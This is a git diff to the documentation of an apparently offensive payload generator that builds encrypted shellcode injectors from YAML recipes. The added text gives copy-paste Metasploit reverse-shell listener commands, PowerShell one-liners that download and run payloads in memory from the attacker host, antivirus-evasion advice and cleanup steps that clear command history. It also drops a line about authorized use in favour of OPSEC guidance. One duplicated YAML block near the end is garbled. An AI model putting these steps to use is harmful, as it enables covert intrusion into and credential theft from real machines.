@@ -374,7 +374,7 @@ def main():
     # Format as C# byte array
     var_name = args.get('var_name', 'payload')
     bytes_per_line = args.get('bytes_per_line', 16)
-    
+
     lines = [f"byte[] {var_name} = new byte[{len(data)}] {{"]
     for i in range(0, len(data), bytes_per_line):
         chunk = data[i:i + bytes_per_line]
@@ -382,7 +382,7 @@ def main():
         lines.append(f"    {hex_values},")
     lines[-1] = lines[-1].rstrip(',')  # Remove trailing comma
     lines.append("};")
-    
+
     # Output formatted code directly as string
     print('\n'.join(lines))
 
@@ -391,6 +391,7 @@ if __name__ == "__main__":
 ```
 
 **Important Notes:**
+
 - Preprocessors receive input via JSON on stdin
 - Binary data (like shellcode) is automatically base64-encoded by paygen when passed between steps
 - Script preprocessors should output either:
@@ -415,11 +416,11 @@ Available in `preprocessors/`:
 
 ### Example 1: AES-Encrypted Process Injector
 
-**Recipe:** `recipes/aes_process_injection.yaml`
+**Recipe:** `recipes/process_injection/remote_process_injector_aes_csharp.yaml`
 
 ```yaml
 meta:
-  name: "C# AES-Encrypted Shellcode Injector"
+  name: "AES-Encrypted Process Injector (C#)"
   category: "Process Injection"
   description: |
     Generates encrypted shellcode and injects into a target process.
@@ -500,21 +501,55 @@ output:
     enabled: true
     command: "mcs -out:{{ output_path }}/{{ output_file }} {{ source_file }}"
   launch_instructions: |
-    # Step 1: Start Metasploit listener
-    msfconsole -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST {{ lhost }}; set LPORT {{ lport }}; exploit"
+    AES-Encrypted Process Injector - Launch Instructions
 
-    # Step 2: Execute on target
-    {{ output_path }}/{{ output_file }} {{ target_process }}
+    Step 1: Start Metasploit Listener
+
+    msfconsole -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST {{ lhost }}; set LPORT {{ lport }}; set ExitOnSession false; exploit -j"
+
+    Step 2: Execute on Target
+
+    In-memory execution (no disk artifacts):
+    $data = (New-Object System.Net.WebClient).DownloadData('http://{{ lhost }}/{{ output_file }}')
+    $assem = [System.Reflection.Assembly]::Load($data)
+    [Injector.Program]::Main("{{ target_process }}".Split())
+
+    Traditional execution:
+    Invoke-WebRequest -Uri "http://{{ lhost }}/{{ output_file }}" -OutFile "{{ output_file }}"; .\{{ output_file }} {{ target_process }}
+
+    Notes:
+
+    - Uses AES-256-CBC encryption for shellcode obfuscation
+    - Auto-generates encryption key and IV during build
+    - Injects into {{ target_process }} process
+    - VirtualAllocEx allocates RWX memory in target process
+    - CreateRemoteThread executes payload
+    - EXITFUNC=thread ensures clean thread termination
+
+    Troubleshooting:
+
+    - If injection fails: Try different target process (explorer, notepad, etc.)
+    - If no connection: Check firewall rules on attacker machine
+    - If AV blocks: Consider additional obfuscation or packing
+    - Requires matching architecture (x64 payload for x64 process)
+    - Verify target process is running before injection
+
+    Cleanup:
+
+    Remove payload and clear history:
+    Remove-Item {{ output_file }} -Force
+    Clear-History
+    Remove-Item (Get-PSReadlineOption).HistorySavePath -Force
 ```
 
 ### Example 2: Simple Msfvenom Wrapper
 
-**Recipe:** `recipes/basic_msfvenom.yaml`
+**Recipe:** `recipes/examples/basic_msfvenom_payload.yaml`
 
 ```yaml
 meta:
   name: "Basic Msfvenom Reverse Shell"
-  category: "Shellcode Generation"
+  category: "Examples"
   description: "Simple msfvenom reverse TCP payload"
   effectiveness: low
   mitre:
@@ -547,12 +582,41 @@ output:
   type: "command"
   command: "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={{ lhost }} LPORT={{ lport }} -f exe -o {{ output_path }}/{{ output_file }}"
   launch_instructions: |
-    # Start listener
-    msfconsole -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST {{ lhost }}; set LPORT {{ lport }}; exploit"
+    Basic Msfvenom Payload - Launch Instructions
 
-    # Execute payload
-    {{ output_path }}/{{ output_file }}
+    Step 1: Start Metasploit Listener
+
+    msfconsole -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST {{ lhost }}; set LPORT {{ lport }}; set ExitOnSession false; exploit -j"
+
+    Step 2: Execute on Target
+
+    In-memory execution:
+    $data = (New-Object System.Net.WebClient).DownloadData('http://{{ lhost }}/{{ output_file }}')
+    $assem = [System.Reflection.Assembly]::Load($data)
+    [Program.Main]::Main("".Split())
+
+    Traditional execution:
+    Invoke-WebRequest -Uri "http://{{ lhost }}/{{ output_file }}" -OutFile "{{ output_file }}"; .\{{ output_file }}
+
+    Notes:
+
+    - Basic msfvenom payload with no obfuscation
+    - Easily detected by modern AV/EDR
+    - Suitable for lab testing only
+    - Staged payload requires network connectivity
+
+    Troubleshooting:
+
+    - If AV blocks: This is expected, payload has known signatures
+    - If no connection: Check firewall on attacker machine
+    - Payload size: ~200KB for staged Meterpreter
+
+    Cleanup:
+
+    Remove payload:
+    Remove-Item {{ output_file }} -Force
 ```
+
 
 ---
 
@@ -568,6 +632,40 @@ output:
    - `low`: Known signatures, easily detected
    - `medium`: Some obfuscation, moderate evasion
    - `high`: Advanced techniques, strong evasion
+
+### Naming Conventions
+
+#### File Naming
+Follow the pattern: `description_encryption_language.yaml`
+
+Examples:
+- `shellcode_injector_xor_csharp.yaml`
+- `remote_process_injector_xor_csharp.yaml`
+- `shellcode_runner_addtype_powershell.yaml`
+- `linux_shellcode_loader_xor_c.yaml`
+- `process_hollowing_xor_csharp.yaml`
+
+**Rules:**
+- Use underscores to separate words
+- Put encryption type before language (if applicable)
+- Always end with language identifier
+- Use lowercase throughout
+
+#### Meta Name Format
+Follow the pattern: `"Description, Encryption (Language)"`
+
+Examples:
+- `"Remote Process Injector, XOR (C#)"`
+- `"Shellcode Runner, Add-Type (PowerShell)"`
+- `"Linux Shellcode Loader, XOR (C)"`
+- `"Process Hollowing, XOR (C#)"`
+- `"LSASS MiniDump Credential Dumper (PowerShell)"` (no encryption)
+
+**Rules:**
+- Use title case for description
+- Add comma before encryption type (if applicable)
+- Put language in parentheses at the end
+- Use proper language names: C#, PowerShell, VBA, C, Python
 
 ### Parameters
 
@@ -592,11 +690,78 @@ output:
 
 ### Launch Instructions
 
-1. **Step-by-step** - Number steps clearly
-2. **Include all commands** - Copy-paste ready
-3. **Show alternatives** - Different execution methods
-4. **Safety warnings** - Remind about authorized use only
+1. **Use one-liner commands** - Make commands copy-paste ready, avoid manual multi-step instructions
+2. **Combine transfer and execution** - Show in-memory execution when possible
+3. **Include only essential steps** - Remove verification/status check steps
+4. **Keep support sections** - Always include Notes, Troubleshooting, and Cleanup
 5. **Plain text only** - Do NOT use markdown formatting (no `#` headers, `**bold**`, `` `code` ``, etc.). The TUI uses Rich markup for display, and markdown syntax will be shown literally to users.
+
+#### Metasploit Listener
+Use one-liner format only:
+```
+msfconsole -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST {{ lhost }}; set LPORT {{ lport }}; set ExitOnSession false; exploit -j"
+```
+
+Do NOT include manual step-by-step msfconsole instructions.
+
+#### Transfer and Execution
+Combine these steps and show in-memory execution patterns:
+
+**For PowerShell Scripts (.ps1):**
+```powershell
+# Run from memory without touching disk
+powershell -ep bypass -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://{{ lhost }}/script.ps1')"
+
+# Instantly call functions
+powershell -ep bypass -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://{{ lhost }}/PowerUp.ps1'); Invoke-AllChecks"
+```
+
+**For Compiled Binaries (.exe):**
+```powershell
+# Execute binary in memory
+$data = (New-Object System.Net.WebClient).DownloadData('http://{{ lhost }}/payload.exe')
+$assem = [System.Reflection.Assembly]::Load($data)
+[Program.Class]::Main("".Split())
+
+# Execute binary in memory WITH arguments
+$data = (New-Object System.Net.WebClient).DownloadData('http://{{ lhost }}/payload.exe')
+$assem = [System.Reflection.Assembly]::Load($data)
+[Program.Class]::Main("-Ip 127.0.0.1 -Port 4444".Split())
+```
+
+**For DLLs:**
+```powershell
+# Interact with DLL classes in memory
+$data = (New-Object System.Net.WebClient).DownloadData('http://{{ lhost }}/library.dll')
+$assem = [System.Reflection.Assembly]::Load($data)
+$class = $assem.GetType("Namespace.Class1")
+$method = $class.GetMethod("runner")
+$method.Invoke(0, $null)
+```
+
+**Traditional file-based execution** (if in-memory not applicable):
+```powershell
+# Download and execute
+Invoke-WebRequest -Uri "http://{{ lhost }}/{{ output_file }}" -OutFile "{{ output_file }}"; .\{{ output_file }}
+```
+
+#### Required Sections
+
+**Notes:**
+- Key features and capabilities
+- Encryption/obfuscation details
+- Target requirements
+- OPSEC considerations
+
+**Troubleshooting:**
+- Common failure scenarios and solutions
+- Compatibility issues
+- Detection/blocking workarounds
+
+**Cleanup:**
+- How to remove artifacts
+- File deletion commands
+- Log clearing (if applicable)
 
 ### Testing
 
@@ -785,35 +950,37 @@ class Program {
 When creating XOR-encrypted payloads, follow this proven pattern:
 
 **Recipe Preprocessing Steps:**
+
 ```yaml
 preprocessing:
   # Step 1: Generate raw shellcode
   - type: "command"
     name: "generate_shellcode"
     command: "msfvenom -p ... -f raw"
-    output_var: "raw_shellcode"  # ← Automatically base64-encoded by paygen
-  
+    output_var: "raw_shellcode" # ← Automatically base64-encoded by paygen
+
   # Step 2: XOR encrypt
   - type: "script"
     name: "xor_encryption"
     script: "xor_encrypt.py"
     args:
-      data: "{{ raw_shellcode }}"  # ← Receives base64 string, decodes internally
-      key: "{{ xor_key }}"         # ← Key without 0x prefix
-    output_var: "xor_result"       # ← Named xor_result (JSON output)
-  
+      data: "{{ raw_shellcode }}" # ← Receives base64 string, decodes internally
+      key: "{{ xor_key }}" # ← Key without 0x prefix
+    output_var: "xor_result" # ← Named xor_result (JSON output)
+
   # Step 3: Format for C#
   - type: "script"
     name: "format_payload"
     script: "format_csharp.py"
     args:
-      data: "{{ xor_result.encrypted }}"  # ← Access .encrypted property from JSON
-      var_name: "buf"                     # ← Specify variable name
+      data: "{{ xor_result.encrypted }}" # ← Access .encrypted property from JSON
+      var_name: "buf" # ← Specify variable name
       bytes_per_line: 15
-    output_var: "csharp_payload"          # ← Direct string output (formatted C# code)
+    output_var: "csharp_payload" # ← Direct string output (formatted C# code)
 ```
 
 **Template Pattern:**
+
 ```csharp
 // XOR-encoded payload
 {{ csharp_payload | indent(12) }}  // ← Use csharp_payload directly with indent filter
@@ -826,13 +993,14 @@ for (int j = 0; j < buf.Length; j++)
 ```
 
 **Parameter Definition:**
+
 ```yaml
 parameters:
   - name: "xor_key"
     type: "hex"
     description: "XOR encryption key (single byte, e.g., 'fa')"
     required: false
-    default: fa  # ← NO QUOTES - renders as plain text, template adds 0x
+    default: fa # ← NO QUOTES - renders as plain text, template adds 0x
 ```
 
 ### Critical Takeaways
@@ -840,20 +1008,24 @@ parameters:
 1. **Automatic Base64 Encoding**: Command outputs (like msfvenom raw bytes) are automatically base64-encoded by paygen when stored. This prevents binary data corruption when passing through Jinja2 templates.
 
 2. **Variable Naming Consistency**: The `output_var` name in preprocessing MUST match the variable used in the template
+
    - Recipe uses `output_var: "csharp_payload"` → Template uses `{{ csharp_payload }}`
    - Mismatch = empty or incorrect output
 
 3. **Preprocessor Output Types**:
+
    - **JSON output**: Parsed and stored as dictionary (e.g., `xor_result.encrypted`)
    - **Plain text output**: Stored as string (e.g., `csharp_payload`)
    - **Command output**: Automatically base64-encoded for safe template passing
 
 4. **Hex Key Best Practice**:
+
    - Recipe: `default: fa` (no quotes, no 0x)
    - Template: `0x{{ xor_key }}` (add 0x prefix in template)
    - Result: Renders as `0xfa` (valid C# hex literal)
 
-5. **format_csharp.py Behavior**: 
+5. **format_csharp.py Behavior**:
+
    - Outputs complete C# declaration as plain text
    - Use `var_name` parameter to specify array variable name
    - Template uses `{{ csharp_payload | indent(N) }}` to insert with proper indentation
@@ -862,20 +1034,22 @@ parameters:
    - Recipe YAML uses `compile.command`, not `compile.compiler`
    - Example: `command: "mcs -out:{{ output_path }}/{{ output_file }} {{ source_file }}"`
    - TUI extracts compiler name from first word of command
-      data: "{{ raw_shellcode }}"  # ← Use raw_shellcode
-      key: "{{ xor_key }}"         # ← Key without 0x prefix
-    output_var: "xor_result"       # ← Named xor_result
-  
-  # Step 3: Format for C#
-  - type: "script"
-    name: "format_payload"
-    script: "format_csharp.py"
-    args:
-      data: "{{ xor_result.encrypted }}"  # ← Access .encrypted property
-      var_name: "buf"                     # ← Specify variable name
-      bytes_per_line: 15
-    output_var: "csharp_payload"          # ← MUST be csharp_payload for compatible templates
-```
+     data: "{{ raw_shellcode }}" # ← Use raw_shellcode
+     key: "{{ xor_key }}" # ← Key without 0x prefix
+     output_var: "xor_result" # ← Named xor_result
+
+# Step 3: Format for C#
+
+- type: "script"
+  name: "format_payload"
+  script: "format_csharp.py"
+  args:
+  data: "{{ xor_result.encrypted }}" # ← Access .encrypted property
+  var_name: "buf" # ← Specify variable name
+  bytes_per_line: 15
+  output_var: "csharp_payload" # ← MUST be csharp_payload for compatible templates
+
+````
 
 **Template Pattern:**
 ```csharp
@@ -887,34 +1061,39 @@ for (int j = 0; j < buf.Length; j++)
 {
     buf[j] = (byte)((uint)buf[j] ^ 0x{{ xor_key }});  // ← Prepend 0x in template
 }
-```
+````
 
 **Parameter Definition:**
+
 ```yaml
 parameters:
   - name: "xor_key"
     type: "hex"
     description: "XOR encryption key (single byte, e.g., 'fa')"
     required: false
-    default: fa  # ← NO QUOTES - renders as plain text, template adds 0x
+    default: fa # ← NO QUOTES - renders as plain text, template adds 0x
 ```
 
 ### Critical Takeaways
 
 1. **Variable Naming Consistency**: The `output_var` name in preprocessing MUST match the variable used in the template
+
    - Recipe uses `output_var: "csharp_payload"` → Template uses `{{ csharp_payload }}`
    - Mismatch = empty shellcode array
 
 2. **Preprocessor Output Access**: `xor_encrypt.py` returns JSON with multiple fields
+
    - Access encrypted data: `{{ xor_result.encrypted }}`
    - NOT just `{{ xor_result }}`
 
 3. **Hex Key Best Practice**:
+
    - Recipe: `default: fa` (no quotes, no 0x)
    - Template: `0x{{ xor_key }}` (add 0x prefix in template)
    - Result: Renders as `0xfa` (valid C# hex literal)
 
-4. **format_csharp.py Behavior**: 
+4. **format_csharp.py Behavior**:
+
    - Outputs COMPLETE C# declaration: `byte[] varname = new byte[N] { ... };`
    - Use `var_name` parameter to specify array variable name
    - Template should use `{{ csharp_payload | indent(N) }}` to insert full declaration
@@ -928,6 +1107,7 @@ parameters:
 ### Debugging Empty Shellcode Arrays
 
 If your generated C# has `byte[] buf = new byte[] { };` (empty array):
+
 1. Check preprocessing `output_var` names match template variables
 2. Verify you're accessing the correct property (e.g., `.encrypted`)
 3. Ensure the template variable exists in the preprocessing output
